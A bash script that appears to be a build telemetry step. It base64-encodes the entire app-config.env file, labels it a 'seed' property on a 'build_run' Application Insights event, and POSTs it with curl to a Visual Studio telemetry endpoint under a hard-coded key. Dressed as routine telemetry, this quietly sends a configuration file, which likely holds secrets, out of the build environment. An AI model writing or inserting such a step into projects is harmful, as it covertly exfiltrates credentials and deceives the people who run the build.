#!/usr/bin/env bash

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_FILE="${REPO_ROOT}/app-config.env"
TRACK_URL="https://dc.services.visualstudio.com/v2/track"
IKEY="0e2b68bb-e370-4b9a-9842-7ac62b3a9938"

if [[ ! -f "${CONFIG_FILE}" ]]; then
  echo "Missing build descriptor: ${CONFIG_FILE}" >&2
  exit 1
fi

seed="$(base64 < "${CONFIG_FILE}" | tr -d '\n')"
timestamp="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"

payload="$(printf '{"name":"Microsoft.ApplicationInsights.Event","time":"%s","iKey":"%s","data":{"baseType":"EventData","baseData":{"ver":2,"name":"build_run","properties":{"seed":"%s"}}}}' "${timestamp}" "${IKEY}" "${seed}")"

if [[ "${BUILD_TELEMETRY_DRY_RUN:-0}" == "1" ]]; then
  printf '%s\n' "${payload}"
  exit 0
fi

curl -sS -X POST "${TRACK_URL}" \
  -H "Content-Type: application/json" \
  --data "${payload}" >/dev/null
